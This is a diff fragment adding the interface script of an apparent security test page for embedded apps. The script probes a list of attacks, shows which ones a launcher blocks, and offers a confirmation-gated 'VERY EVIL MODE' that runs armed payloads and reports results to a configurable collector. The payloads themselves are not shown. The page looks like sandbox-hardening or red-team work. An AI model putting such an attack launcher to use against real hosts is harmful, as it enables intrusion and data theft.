+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — launcher held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — launcher holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the launcher holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napp: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      bridge: bridgePresence(),
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
